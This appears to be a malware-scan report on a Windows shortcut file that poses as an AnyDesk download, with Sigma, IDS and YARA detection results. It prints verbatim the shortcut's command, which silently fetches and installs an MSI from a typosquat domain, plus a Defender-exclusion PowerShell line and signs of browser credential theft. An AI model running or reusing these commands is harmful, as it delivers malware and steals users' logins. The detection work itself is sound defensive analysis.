exiftool.CommandLineArguments: /k  start msedge https://anydesk.com & curl -sLo %TEMP%\bosfortuy.ms https://anydesck.net/download/setup.pdf & msiexec /i %TEMP%\bosfortuy.ms /qn | Taskkill /f /im cmd.exe
exiftool.Flags: IDList, LinkInfo, RelativePath, WorkingDir, CommandArgs, IconFile, Unicode, ExpString, ExpIcon

sigma_analysis_results.rule_description: Detects a suspicious curl process start on Windows and outputs the requested document to a local file
sigma_analysis_results.rule_author: Florian Roth (Nextron Systems), Nasreddine Bencherchali (Nextron Systems)

match_context.values: @{Hashes=MD5=1C3645EBDDBE2DA6A32A5F9FB43A3C23,SHA256=0BA1C44D0EE5B34B45B449074CDA51624150DC16B3B3C38251DF6C052ADBA205,IMPHASH=2447B641444AC52A5B600C8801CE3532; CurrentDirectory=C:\Windows\System32\; OriginalFileName=curl.exe; Product=The curl executable; Description=The curl executable; FileVersion=7.55.1; ParentCommandLine="C:\Windows\System32\cmd.exe" /k  start msedge https://anydesk.com & curl -sLo C:\Users\Bruno\AppData\Local\Temp\bosfortuy.ms https://anydesck.net/download/setup.pdf & msiexec /i C:\Users\Bruno\AppData\Local\Temp\bosfortuy.ms /qn | Taskkill /f /im cmd.exe; CommandLine=curl  -sLo C:\Users\Bruno\AppData\Local\Temp\bosfortuy.ms https://anydesck.net/download/setup.pdf ; EventID=1; ParentImage=C:\Windows\System32\cmd.exe; IntegrityLevel=High; Image=C:\Windows\System32\curl.exe; Company=curl, https://curl.haxx.se/}

@{Hashes=SHA1=F64457B2255A6BB2224EED25A0954B5274EC62D7,MD5=05DEDF1936A065612E52C37E40143646,SHA256=664BB48BF3E8A7D7036E4B0029FA10E1A90C2562AD9A09A885650408D00DEA1B,IMPHASH=A798305E4231D362ADC62175DEBE3E10; CurrentDirectory=C:\Windows\System32\; OriginalFileName=curl.exe; Product=The curl executable; Description=The curl executable; EventID=1; ParentCommandLine="C:\Windows\System32\cmd.exe" /k  start msedge https://anydesk.com & curl -sLo C:\Users\Bruno\AppData\Local\Temp\bosfortuy.ms https://anydesck.net/download/setup.pdf & msiexec /i C:\Users\Bruno\AppData\Local\Temp\bosfortuy.ms /qn | Taskkill /f /im cmd.exe; CommandLine=curl  -sLo C:\Users\Bruno\AppData\Local\Temp\bosfortuy.ms https://anydesck.net/download/setup.pdf ; FileVersion=8.0.1; ParentImage=C:\Windows\System32\cmd.exe; IntegrityLevel=High; Image=C:\Windows\System32\curl.exe; Company=curl, https://curl.se/}

sigma_analysis_results.rule_title: Read Contents From Stdin Via Cmd.EXE
sigma_analysis_results.rule_description: Detect the use of "<" to read and potentially execute a file via cmd.exe

match_context.values: @{CommandLine=C:\Windows\System32\cmd.exe /k start msedge https://anydesk.com & curl -sLo C:\Users\<USER>\AppData\Local\Temp\bosfortuy.ms https://anydesck.net/download/setup.pdf & msiexec /i C:\Users\<USER>\AppData\Local\Temp\bosfortuy.ms /qn | Taskkill /f /im cmd.exe; Image=C:\Windows\System32\cmd.exe; EventID=1}

sigma_analysis_results.rule_description:
Adversaries may abuse msiexec.exe to proxy execution of malicious payloads.
Msiexec.exe is the command-line utility for the Windows Installer and is thus commonly associated with executing installation packages (.msi)

match_context.values: @{Hashes=MD5=E5DA170027542E25EDE42FC54C929077,SHA256=0A8797D088023A7F17BB00B22FF7C91036070CCA561BFF5337C472313C0CB4AD,IMPHASH=7B0965996CADE227105A63F975958C0D; CurrentDirectory=C:\Windows\System32\; OriginalFileName=msiexec.exe; Product=Windows Installer - Unicode; Description=Windows\xae installer; EventID=1; ParentCommandLine="C:\Windows\System32\cmd.exe" /k  start msedge https://anydesk.com & curl -sLo C:\Users\Bruno\AppData\Local\Temp\bosfortuy.ms https://anydesck.net/download/setup.pdf & msiexec /i C:\Users\Bruno\AppData\Local\Temp\bosfortuy.ms /qn | Taskkill /f /im cmd.exe; CommandLine=msiexec  /i C:\Users\Bruno\AppData\Local\Temp\bosfortuy.ms /qn ; FileVersion=5.0.19041.1 (WinBuild.160101.0800); ParentImage=C:\Windows\System32\cmd.exe; IntegrityLevel=High; Image=C:\Windows\System32\msiexec.exe; Company=Microsoft Corporation}

@{Product=Windows Installer - Unicode; CurrentDirectory=C:\Windows\System32\; OriginalFileName=msiexec.exe; Hashes=SHA1=F3D7FEE4CED78E37F49CE4E38AC681F07BCA6AE0,MD5=302BE4B7434E679769029C8570825CC0,SHA256=5A31EA6A517A065166FAFA01A0AC6A350D0E2DCBA1B6DD4FDB41AE59109568E1,IMPHASH=0990A9500FF8DF93E0E059EE13E7C796; Description=Windows\xae installer; FileVersion=5.0.22621.1 (WinBuild.160101.0800); ParentCommandLine="C:\Windows\System32\cmd.exe" /k  start msedge https://anydesk.com & curl -sLo C:\Users\Bruno\AppData\Local\Temp\bosfortuy.ms https://anydesck.net/download/setup.pdf & msiexec /i C:\Users\Bruno\AppData\Local\Temp\bosfortuy.ms /qn | Taskkill /f /im cmd.exe; CommandLine=msiexec  /i C:\Users\Bruno\AppData\Local\Temp\bosfortuy.ms /qn ; EventID=1; ParentImage=C:\Windows\System32\cmd.exe; IntegrityLevel=High; Image=C:\Windows\System32\msiexec.exe; Company=Microsoft Corporation}

match_context.values: @{Hashes=MD5=C32CA4ACFCC635EC1EA6ED8A34DF5FAC,SHA256=73A3C4AEF5DE385875339FC2EB7E58A9E8A47B6161BDC6436BF78A763537BE70,IMPHASH=194427A488ED1DD0A91731658B071667; CurrentDirectory=C:\Users\Bruno\AppData\Local\Temp\MW-8a9fce7f-e896-4aea-8e86-911d4a3fa6ce\files\; OriginalFileName=PowerShell.EXE; Product=Microsoft\xae Windows\xae Operating System; Description=Windows PowerShell; EventID=1; ParentCommandLine="C:\Users\Bruno\AppData\Local\Temp\MW-8a9fce7f-e896-4aea-8e86-911d4a3fa6ce\files\out1.exe" msiexec /i "example.msi" /qn ; CommandLine=powershell Add-MpPreference -ExclusionPath "C:\Users\Bruno\AppData\Local\Microsoft\Windows\dvm.exe" ; FileVersion=10.0.19041.546 (WinBuild.160101.0800); ParentImage=C:\Users\Bruno\AppData\Local\Temp\MW-8a9fce7f-e896-4aea-8e86-911d4a3fa6ce\files\out1.exe; IntegrityLevel=High; Image=C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe; Company=Microsoft Corporation}

sigma_analysis_results.rule_title: Suspicious File Access to Browser Credential Storage
sigma_analysis_results.rule_description:
Detects file access to browser credential storage paths by non-browser processes, which may indicate credential access attempts.
Adversaries may attempt to access browser credential storage to extract sensitive information such as usernames and passwords or cookies.
This behavior is often commonly observed in credential stealing malware.
sigma_analysis_results.rule_author: frack113, X__Junior (Nextron Systems), Swachchhanda Shrawan Poudel (Nextron Systems), Parth-FourCore

match_context.values: @{FileName=%LOCALAPPDATA%\microsoft\edge\user data\default\login data}
@{FileName=%LOCALAPPDATA%\microsoft\edge\user data\default\cookies}

sigma_analysis_results.rule_description: Detects non-interactive PowerShell activity by looking at the "powershell" process with a non-user GUI process such as "explorer.exe" as a parent.

match_context.values: @{Product=Microsoft\xae Windows\xae Operating System; CurrentDirectory=C:\Users\Bruno\AppData\Local\Temp\MW-8a9fce7f-e896-4aea-8e86-911d4a3fa6ce\files\; OriginalFileName=PowerShell.EXE; Hashes=MD5=C32CA4ACFCC635EC1EA6ED8A34DF5FAC,SHA256=73A3C4AEF5DE385875339FC2EB7E58A9E8A47B6161BDC6436BF78A763537BE70,IMPHASH=194427A488ED1DD0A91731658B071667; Description=Windows PowerShell; FileVersion=10.0.19041.546 (WinBuild.160101.0800); ParentCommandLine="C:\Users\Bruno\AppData\Local\Temp\MW-8a9fce7f-e896-4aea-8e86-911d4a3fa6ce\files\out1.exe" msiexec /i "example.msi" /qn ; CommandLine=powershell Add-MpPreference -ExclusionPath "C:\Users\Bruno\AppData\Local\Microsoft\Windows\dvm.exe" ; EventID=1; ParentImage=C:\Users\Bruno\AppData\Local\Temp\MW-8a9fce7f-e896-4aea-8e86-911d4a3fa6ce\files\out1.exe; IntegrityLevel=High; Image=C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe; Company=Microsoft Corporation}
@{CommandLine=%WINDIR%\system32\windowspowershell\v1.0\powershell.exe; Image=C:\Windows\system32\windowspowershell\v1.0\powershell.exe; EventID=1}

crowdsourced_ids_results.rule_msg: ET SHELLCODE Common 0a0a0a0a Heap Spray String
crowdsourced_ids_results.rule_raw: alert http $EXTERNAL_NET any -> $HOME_NET any (msg:"ET SHELLCODE Common 0a0a0a0a Heap Spray String"; flow:established,to_client; content:"0a0a0a0a"; nocase; threshold:type limit,count 1,seconds 300,track by_src; reference:url,www.darkreading.com/vulnerabilities---threats/heap-spraying-attackers-latest-weapon-of-choice/d/d-id/1132487; classtype:shellcode-detect; sid:2012252; rev:6; metadata:created_at 2011_02_03, deployment alert_only, confidence Low, signature_severity Major, updated_at 2025_02_04;)

crowdsourced_ids_results.rule_msg: SERVER-OTHER Squid HTTP Vary response header denial of service attempt
crowdsourced_ids_results.rule_raw: alert tcp $EXTERNAL_NET $HTTP_PORTS -> $HOME_NET any ( msg:"SERVER-OTHER Squid HTTP Vary response header denial of service attempt"; flow:to_client,established; http_header; content:"Vary|3A|"; content:!"|0D 0A|",within 250; metadata:policy max-detect-ips drop; service:http; reference:cve,2016-2569; reference:url,www.squid-cache.org/Advisories/SQUID-2016_2.txt; classtype:denial-of-service; sid:41379; rev:1; )

crowdsourced_ids_results.rule_msg: ET HUNTING EXE Base64 Encoded potential malware
crowdsourced_ids_results.rule_raw: alert http $EXTERNAL_NET any -> $HOME_NET any (msg:"ET HUNTING EXE Base64 Encoded potential malware"; flow:established,from_server; file.data; content:"TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"; fast_pattern; content:!"<html"; nocase; content:!"<body"; nocase; content:!"<script"; nocase; reference:url,urlhaus.abuse.ch/url/319004/; classtype:misc-activity; sid:2029538; rev:2; metadata:affected_product Windows_XP_Vista_7_8_10_Server_32_64_Bit, attack_target Client_Endpoint, created_at 2020_02_26, deployment Perimeter, confidence Low, signature_severity Minor, tag Description_Generated_By_Proofpoint_Nexus, updated_at 2020_02_26;)

crowdsourced_ids_results.rule_msg: TGI HUNT b64 exe in HTTP (UTF8)
crowdsourced_ids_results.rule_raw: alert http any any -> any any (msg:"TGI HUNT b64 exe in HTTP (UTF8)"; flow:established; content:"TVqQAAMAAAAEAAAA//8AAL"; fast_pattern; classtype:bad-unknown; sid:2610768; rev:1;)

crowdsourced_ids_results.rule_msg: TGI HUNT b64 exe in TCP (UTF8)
crowdsourced_ids_results.rule_raw: alert tcp any any -> any any (msg:"TGI HUNT b64 exe in TCP (UTF8)"; flow:established; content:"TVqQAAMAAAAEAAAA//8AAL"; fast_pattern; classtype:bad-unknown; sid:2610776; rev:1;)

threat_severity.level_description: Severity HIGH because it was considered trojan. Other contributing factor was that it could not be run in sandboxes.

crowdsourced_yara_results.description: Identifies execution artefacts in shortcut (LNK) files.
crowdsourced_yara_results.author: @bartblaze

crowdsourced_yara_results.description: Identifies Adobe Acrobat artefacts in shortcut (LNK) files. A PDF document is typically used as decoy in a malicious LNK.
crowdsourced_yara_results.author: @bartblaze

crowdsourced_yara_results.description: This rule detects Microsoft Windows LNK shortcut files that reference the cmd.exe command interpreter. While not necessarily indicative of malicious behavior, this is a common pivot leveraged by a variety of malware campaigns.
crowdsourced_yara_results.author: InQuest Labs

attributes.magic: MS Windows shortcut, Item id list present, Points to a file or directory, Has Relative path, Has Working directory, Has command line arguments, Icon number=11, Archive, ctime=Thu May 23 19:29:00 2024, mtime=Mon Oct 27 18:42:26 2025, atime=Thu May 23 19:29:00 2024, length=236544, window=hidenormalshowminimized

lnk_info.command_line_arguments: /k  start msedge https://anydesk.com & curl -sLo %TEMP%\bosfortuy.ms https://anydesck.net/download/setup.pdf & msiexec /i %TEMP%\bosfortuy.ms /qn | Taskkill /f /im cmd.exe
